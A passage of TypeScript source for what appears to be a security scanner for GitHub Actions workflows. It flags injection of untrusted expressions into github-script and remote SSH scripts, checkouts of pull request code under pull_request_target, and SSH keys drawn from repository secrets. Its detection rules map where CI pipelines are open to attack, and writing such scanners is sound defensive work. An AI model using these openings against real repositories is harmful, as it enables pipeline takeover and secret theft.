  for (const [, job] of entries(get(root, 'jobs'))) {
    if (!isMap(job)) continue;
    const jobTaint = cloneTaint(workflowTaint);
    taintFromEnv(envOf(get(job, 'env')), ctx, jobTaint);
    const steps = get(job, 'steps');
    if (!isSeq(steps)) continue;

    let keyLine: number | null = null;
    let usesSsh = false;

    for (const step of steps.items) {
      if (!isMap(step)) continue;
      const env = envOf(get(step, 'env'));
      const uses = str(get(step, 'uses')) ?? '';
      const withNode = get(step, 'with');
      const run = get(step, 'run');

      if (run) {
        const script = scriptOf(run, lc, source);
        if (script) {
          const exported = analyseScript({ script, env }, ctx, jobTaint, emit);
          for (const v of exported.vars) jobTaint.vars.add(v);
          for (const v of exported.secrets) jobTaint.secrets.add(v);

          const stepSecrets = [...env.values()].some((v) => SECRET_EXPRESSION.test(v)) ||
            script.lines.some((l) => SECRET_EXPRESSION.test(l));
          script.lines.forEach((line, i) => {
            if (keyLine === null && stepSecrets && SSH_KEY_WRITE.test(line)) keyLine = script.sourceLine[i]!;
            if (SSH_USE.test(` ${line}`) && !/^\s*#/.test(line)) usesSsh = true;
          });
        }
      }

      if (uses) {
        // github-script: the script body is JavaScript, and `${{ }}` lands in it the same way.
        if (/^actions\/github-script@/i.test(uses)) {
          const body = get(withNode, 'script');
          const script = body ? scriptOf(body, lc, source) : undefined;
          script?.lines.forEach((line, i) => {
            for (const m of line.matchAll(EXPRESSION)) {
              if (!expressionIsTainted(m[1]!, ctx)) continue;
              emit('gha-expression-injection', script.sourceLine[i]!,
                `\`\${{ ${m[1]!.trim()} }}\` is interpolated into a github-script JavaScript body`);
              break;
            }
          });
        }

        if (SSH_KEY_ACTIONS.test(uses)) {
          const carriesSecret = entries(withNode).some(([, v]) => SECRET_EXPRESSION.test(str(v) ?? ''));
          if (carriesSecret && keyLine === null) keyLine = lineOf(get(step, 'uses'));
          if (/ssh-action|scp-action|ssh-deploy/i.test(uses)) usesSsh = true;

          // appleboy/ssh-action and friends run `script:` on the remote host.
          const remoteScript = get(withNode, 'script') ?? get(withNode, 'script_stop');
          const script = remoteScript ? scriptOf(remoteScript, lc, source) : undefined;
          script?.lines.forEach((line, i) => {
            for (const m of line.matchAll(EXPRESSION)) {
              if (!expressionIsTainted(m[1]!, ctx)) continue;
              const whole = line.trim() === m[0];
              const ref: Ref = { start: 0, end: 0, name: m[1]!.trim(), expression: true, tainted: true, secret: false };
              const label = `\`\${{ ${ref.name} }}\``;
              if (whole && isDispatchable(ctx)) {
                emit('gha-dispatch-remote-exec', script.sourceLine[i]!, `${label} is executed as a command on a remote host by \`${uses}\``);
              } else {
                emit('gha-input-in-remote-shell', script.sourceLine[i]!, `${label} is interpolated into a script \`${uses}\` runs on a remote host`);
              }
              break;
            }
          });
        }

        if (prTarget && /^actions\/checkout@/i.test(uses)) {
          for (const key of ['ref', 'repository']) {
            const node = get(withNode, key);
            const value = str(node) ?? '';
            if (/github\.event\.pull_request\.(?:head\.(?:sha|ref|repo\.full_name)|merge_commit_sha|number)|github\.head_ref/.test(value)) {
              emit('gha-pull-request-target-checkout', lineOf(node),
                `\`${key}: ${value.trim()}\` checks out pull request code in a pull_request_target workflow`);
              break;
            }
          }
        }
      }
    }

    if (keyLine !== null && usesSsh) {
      emit('gha-ssh-key-secret', keyLine,
        'An SSH private key from a repository secret is installed and used to reach a host. The repository cannot show whether the server-side authorized_keys entry restricts it; verify it carries `restrict,command=…`');
    }
  }

  return matches.sort((a, b) => a.line - b.line);
}
